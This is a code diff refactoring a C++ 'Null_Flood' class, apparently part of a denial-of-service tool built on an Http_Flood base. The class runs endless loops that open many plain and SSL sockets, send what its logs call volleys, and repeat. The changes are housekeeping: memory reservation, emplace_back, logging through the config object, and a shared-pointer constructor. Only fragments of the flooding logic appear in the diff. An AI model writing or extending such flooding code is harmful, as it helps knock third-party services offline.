@@ -1,13 +1,14 @@
 
 #include <openssl/ssl.h>
-
+#include <utility>
 #include "../Headers/Null_Flood.hpp"
 
 void Null_Flood::attack(const int *id) {
     int r;
     std::vector<int> sockets;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
+        sockets.emplace_back(0);
     }
     int socktype = conf->protocol;
     while(true) {
@@ -25,13 +26,13 @@ void Null_Flood::attack(const int *id) {
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
@@ -41,11 +42,14 @@ void Null_Flood::attack_ssl(const int *id) {
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
+    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
+    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     int socktype = conf->protocol;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
-        SSLs.push_back(nullptr);
-        CTXs.push_back(nullptr);
+        sockets.emplace_back(0);
+        SSLs.emplace_back(nullptr);
+        CTXs.emplace_back(nullptr);
     }
     while(true) {
         static std::string message;
@@ -66,17 +70,17 @@ void Null_Flood::attack_ssl(const int *id) {
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
-Null_Flood::Null_Flood(const config *conf, Logger *logger) : Http_Flood(conf, logger) {
+Null_Flood::Null_Flood(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {
 
 }
